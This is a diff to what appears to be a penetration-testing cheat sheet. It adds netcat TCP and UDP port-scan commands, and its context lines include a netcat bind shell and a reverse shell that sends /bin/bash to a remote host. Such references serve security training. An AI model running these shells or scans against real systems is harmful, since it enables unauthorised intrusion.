@@ -451,6 +451,11 @@ nc -nlvp 4444 -e cmd.exe                                                     Set
 nc -nv 10.11.0.22 4444 -e /bin/bash                                          Send a reverse shell
 ```
 
+**Port Scanning**
+```
+nc -nvv -w 1 -z 10.11.1.220 3388-3390                        Use netcat to perform a TCP port scan
+nc -nv -u -z -w 1 10.11.1.115 160-162                        Use netcat to perform an UDP port scan
+```
 
 ### <ins>Socat</ins>
 
